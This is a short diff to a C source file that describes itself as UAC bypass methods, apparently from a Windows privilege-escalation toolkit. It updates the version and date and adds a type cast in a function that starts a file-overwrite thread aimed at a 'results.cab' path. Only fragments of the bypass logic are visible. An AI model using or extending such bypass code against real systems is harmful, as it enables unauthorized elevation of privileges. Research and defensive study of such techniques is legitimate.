@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2022
+*  (C) COPYRIGHT AUTHORS, 2020 - 2023
 *
 *  TITLE:       ZCGONVH.C
 *
-*  VERSION:     3.62
+*  VERSION:     3.63
 *
-*  DATE:        04 Jul 2022
+*  DATE:        11 Jan 2023
 *
 *  UAC bypass methods based on zcgonvh original work.
 *
@@ -543,7 +543,7 @@ NTSTATUS ucmVFServerDiagProfileMethod(
         supPathAddBackSlash(ovParams->TargetFile);
         _strcat(ovParams->TargetFile, TEXT("results.cab"));
 
-        OverwriteThreadHandle = CreateThread(NULL, 0, ucmxOverwriteThread, (PVOID)ovParams, 0, NULL);
+        OverwriteThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ucmxOverwriteThread, (PVOID)ovParams, 0, NULL);
         if (OverwriteThreadHandle == NULL) {
             ucmConsolePrintValueUlong(TEXT("[!] Cannot create worker thread\r\n"), GetLastError(), TRUE);
             supHeapFree(ovParams);
